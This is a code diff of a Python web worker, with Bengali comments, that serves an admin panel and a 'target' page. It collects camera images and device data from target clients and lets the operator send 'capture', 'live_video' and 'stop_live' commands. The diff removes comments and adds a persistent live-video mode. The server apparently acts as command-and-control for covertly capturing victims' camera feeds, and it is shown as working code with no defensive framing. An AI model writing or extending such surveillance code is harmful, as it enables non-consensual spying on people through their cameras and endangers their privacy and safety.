@@ -3,7 +3,6 @@ from pathlib import Path
 from urllib.parse import urlparse
 import json
 
-# গ্লোবাল ডিকশনারি (ডেটা সাময়িকভাবে রাখার জন্য)
 clients = {}
 
 class Default(WorkerEntrypoint):
@@ -18,31 +17,27 @@ class Default(WorkerEntrypoint):
             "Access-Control-Allow-Headers": "Content-Type",
         }
 
-        # ১. অ্যাডমিন পেজ রুট (/)
         if path in ("", "/") and request.method == "GET":
             admin_file = Path(__file__).parent / "templates" / "admin.html"
             return Response(admin_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})
 
-        # ২. টার্গেট পেজ (/target)
         if path == "/target" and request.method == "GET":
             target_file = Path(__file__).parent / "templates" / "target.html"
             return Response(target_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})
 
-        # ৩. টার্গেট থেকে ডেটা রিসিভ করা (/api/update)
         if path == "/api/update" and request.method == "POST":
             try:
                 data = await request.json()
                 client_id = data.get("id", "unknown_device")
                 
-                # যদি ডেটাতে ক্যামেরার ছবি থাকে
                 if "camera_image" in data:
                     if client_id in clients:
                         clients[client_id]["camera_image"] = data["camera_image"]
                         clients[client_id]["camera_time"] = data.get("time", "")
-                        # কমান্ড রিসেট করা (যাতে বারবার ছবি না তোলে)
-                        clients[client_id]["command"] = None
+                        # লাইভ মোডে থাকলে কমান্ড মুছবে না, অন্যথায় মুছে যাবে
+                        if clients[client_id].get("command") != "live_video":
+                            clients[client_id]["command"] = None
                 else:
-                    # সাধারণ ডেটা আপডেট
                     if client_id not in clients:
                         clients[client_id] = {}
                     
@@ -68,16 +63,14 @@ class Default(WorkerEntrypoint):
             except Exception as e:
                 return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})
 
-        # ৪. অ্যাডমিনের জন্য ডেটা রিড করা (/api/clients)
         if path == "/api/clients" and request.method == "GET":
             return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
 
-        # ৫. অ্যাডমিন থেকে কমান্ড পাঠানো (/api/command)
         if path == "/api/command" and request.method == "POST":
             try:
                 data = await request.json()
                 client_id = data.get("client_id")
-                command = data.get("command")
+                command = data.get("command") # 'capture', 'live_video', 'stop_live'
                 if client_id in clients:
                     clients[client_id]["command"] = command
                     return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
